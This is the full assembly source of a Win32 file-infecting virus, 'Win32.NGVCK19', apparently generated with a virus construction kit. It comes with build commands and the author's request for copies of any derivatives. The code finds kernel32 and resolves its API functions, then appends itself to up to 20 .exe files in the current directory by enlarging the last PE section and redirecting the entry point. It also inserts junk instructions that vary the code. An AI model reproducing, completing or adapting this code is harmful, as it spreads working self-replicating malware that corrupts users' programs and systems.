              
;
;
; Win32.NGVCK19 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK19
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 40
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 41613 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov ecx, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
 sub ecx, offset Delta
                                        ; mov ebp, ecx
                                        ; clear ebp
 mov ebp, -19465d
 add ebp, 19465d
 add ebp, ecx
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea edi, [ebp+filemask]
 xchg edi, eax

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop ebx
 push ebx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea edi, [ebp+APIOffsets]
 xchg edi, esi

 lea edx, [ebp+APINames]


GetApisLoop: 

                                        ; clear eax
 mov eax, 0
 mov al, byte ptr [edx]
                                        ; add edx, 1
 sub edx, -1d

                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; edx points to the Name
                                        ; esi points to the offset

 call SearchAPI1
 push edx
 add dword ptr [esp], eax
 pop edx
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 dec dword ptr [ebp+Trash1]             ; Trash
 add dword ptr [esi], ebx
                                        ; add esi, 4
 dec esi
 adc dword ptr [ebp+Trash1], 1983246    ; Trash
 add esi, 5d
 loop GetApisLoop
 jmp Outbreak



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov edx, ebp
 add edx, offset WFD_szFileName

                                        ; mov eax, 276
 mov eax, 0
 add eax, 276d

ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 sub edx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov ebx, offset WIN32_FIND_DATA
 add ebx, ebp

 push ebx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov ecx, ebp
 add ecx, offset WIN32_FIND_DATA

 push ecx
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; edx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edi, [ebx+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 inc edi
 add edi, 27d
                                        ; get ATableVA
 mov ebx, dword ptr [edi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; add edi, 4
 add edi, 4d
                                        ; get NTableVA
 mov ebx, dword ptr [edi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; add edi, 4
 dec edi
 add edi, 5d
                                        ; get OTableVA
 mov ebx, dword ptr [edi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
                                        ; mov ebx, -1
 mov ebx, 0
 add ebx, -1d
 and ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], ebx
 mov ecx, dword ptr [ebx]
 add ecx, [ebp+KernelMZ]
                                        ; mov ebx, ecx
 mov ebx, ecx
                                        ; mov edi, ecx
                                        ; clear edi
 mov edi, 0
 add edi, ecx
 push eax
 push edi
 pop dword ptr [ebp+TempApisearch2]
 push edx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ch, byte ptr [edi]
 cmp ch, byte ptr [edx]
 jne ApiNotFound
 dec eax
 dec eax
 add eax, 1
 jz FoundApi1
                                        ; add edi, 1
 sub edi, -1d
                                        ; add edx, 1
 inc edx
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edx
 pop eax
                                        ; clear edi
 mov edi, 55619d
 sub edi, 55619d
 xor edi, dword ptr [ebp+TempApisearch2]
 mov ebx, dword ptr [ebp+NTableTemp]
                                        ; add ebx, 4
 add ebx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
                                        ; clear ebx
 mov ebx, -38669d
 add ebx, 38669d
 mov bx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 xchg ebx, ecx
 movzx ebx, word ptr [ecx]
 sal ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; clear ecx
 xor ecx, ecx
 xor ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
 push ecx
 pop dword ptr [ebp+TempAPI]
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edi, [edx+3Ch]
 add edi, edx
                                        ; get File Alignment
                                        ; add edi, 60
 add edi, 60d
 mov edx, [edi]
 inc edi
 neg ebx                                ; Trash
 sub edi, 61d
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], edx
 add eax, VirusSize
 push eax
 pop dword ptr [ebp+AlignReg1]
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 or ebx, 67540452d                      ; Trash
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov edx, esi
 add edx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push edx
 pop esi
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 sub ebx, 1
 imul ebx, ebx, 28h
                                        ; add edx, 120
 add edx, 120d
 add edx, ebx
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [esi+74h]
 sal ebx, 3
 add edx, ebx
                                        ; get old Entrypoint
 mov ecx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], ecx
 mov eax, dword ptr [esi+34h]
 and dword ptr [ebp+Trash1], 394718     ; Trash
 push eax
 pop dword ptr [ebp+OldBase]
                                        ; clear eax
 mov eax, 58401d
 sub eax, 58401d

 mov ecx, ebx                           ; Trash
 add eax, [edx+10h]
                                        ; mov ebx, eax
 mov ebx, eax
 add eax, [edx+14h]
 push eax
 push ebx
 pop ecx
 add ecx, [edx+0Ch]
 mov dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ecx
 mov ecx, [edx+10h]
 push ecx
                                        ; calculate new section size
 add ecx, VirusSize
 push ecx
 pop dword ptr [ebp+AlignReg1]
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [edx+10h], ecx
 pop ecx
 add ecx, VirusSize
 mov dword ptr [edx+08h], ecx
 dec dword ptr [ebp+Trash1]             ; Trash
 mov ecx, dword ptr [edx+10h]
 add ecx, dword ptr [edx+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize
 mov esi, offset Virus
 add esi, ebp


AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
                                        ; mov ebx, -1
 mov ebx, ( -1d xor 21d )
 xor ebx, 21d
 and ebx, dword ptr [ebp+InfCounter]
 sub ebx, 1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 mov ecx, -9248d
 add ecx, 9248d
 add ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx

                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+OldEIP]

 push ebx
 pop dword ptr [ebp+retEIP]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 push ebx
 sub dword ptr [ebp+Trash1], ebx        ; Trash
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 push dword ptr [ebp+WFD_nFileSizeLow]
 adc eax, 61240665d                     ; Trash
 pop edx
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov esi, -1
 push -1d
 pop esi
 and esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ebx, word ptr [esi]
 sub ebx, 'ZM'
 jz Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [esi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
                                        ; clear edx
 mov edx, 40828d
 sub edx, 40828d
 add edx, dword ptr [esi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, esi
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [edx]
 cmp ebx, 'EP'
 je Goodfile2
 mov ecx, ecx                           ; Trash
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jnz yNotagoodfile
 shr ecx, 19d                           ; Trash
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov cx, word ptr [edx+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, 19540d
 sub edx, 19540d
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 inc eax
 mul ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 mov eax, 12907d
 sub eax, 12907d

 push eax
 push eax
 push 3h
 push eax
                                        ; add eax, 1
 sub eax, -1d
 push eax
 mov ebx, 80000000h or 40000000h
 push ebx
 lea edi, [ebp+WFD_szFileName]
 xchg edi, esi

 push esi
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear edx
 push 0
 pop edx
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 sub ebx, 82904988d                     ; Trash

                                        ; clear ecx
 push 0
 pop ecx
 push ecx
 push edx
 push ecx
                                        ; mov ebx, 4
 mov ebx, ( 4d - 13d )
 add ebx, 13d
 push ebx
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop edx
 test eax, eax
 jz CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 sub eax, 1
 inc eax
 jz UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov edi, 077f00000h
 call GetKernel32
 jnc GetApis
 mov edi, 077e00000h
 call GetKernel32
 jnc GetApis
 mov edi, 0bff70000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ebx
 mov ebx, 12798d
 sub ebx, 12798d

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ebx]
 lea edx, [ebp+GetKernel32Exception]
 xchg ebx, edx

 push ebx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 4h
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], ebx

 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx



GK1:                                    ; check for DOS-EXE Stub
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+K32Trys]
 or ecx, ecx
 jz GetKernel32NotFound
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je CheckPE

GK2:
                                        ; mov eax, 65536
 mov eax, 65536d
 sub edi, eax
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add edi, 60
 inc edi
 add edi, 59d
 mov esi, [edi]
 add edi, -60d
 add esi, edi
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], edi
 mov dword ptr [ebp+KernelPE], 0
 add dword ptr [ebp+KernelPE], esi
 sub ebx, eax                           ; Trash

                                        ; clear esi
 push 0
 pop esi

 pop dword ptr fs:[esi]
 pop ecx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear ecx
 and ecx, 0

 mov eax, dword ptr fs:[ecx]
 mov esp, dword ptr [eax]
GetKernel32NotFound:
                                        ; clear ebx
 push 0
 pop ebx

 pop dword ptr fs:[ebx]
 pop eax
 popad
 stc
ret


;                  [ ///// * Data * \\\\\ ]

Data:
 TempApisearch2 dd 0h
 Trash1      dd 0h
 AlignReg2   dd 0h
 NewEIP      dd 0h
 OTableVA    dd 0h
 FileHandle  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 KernelPE    dd 0h
 TempAPI     dd 0h
 filemask    db '*.exe',0
 MapAddress  dd 0h
 KernelMZ    dd 0h
 db 'Win32.NGVCK19 by SnakeByte',0
 counter     dw 0h
 MapHandle   dd 0h

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h

 NewSize     dd 0h
 FindHandle  dd 0h

 APINames:
 db 15d, 'UnmapViewOfFile'
 db 11d, 'CloseHandle'
 db 13d, 'FindNextFileA'
 db 13d, 'MapViewOfFile'
 db 11d, 'CreateFileA'
 db 18d, 'CreateFileMappingA'
 db 14d, 'FindFirstFileA'
 db 09d, 'FindClose'

 NTableVA    dd 0h
 InfCounter  dd 0h
 AlignReg1   dd 0h
 OldEIP      dd 0h
 ATableVA    dd 0h
 K32Trys     dd 0h
 NTableTemp  dd 0h
 OldBase     dd 400000h




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

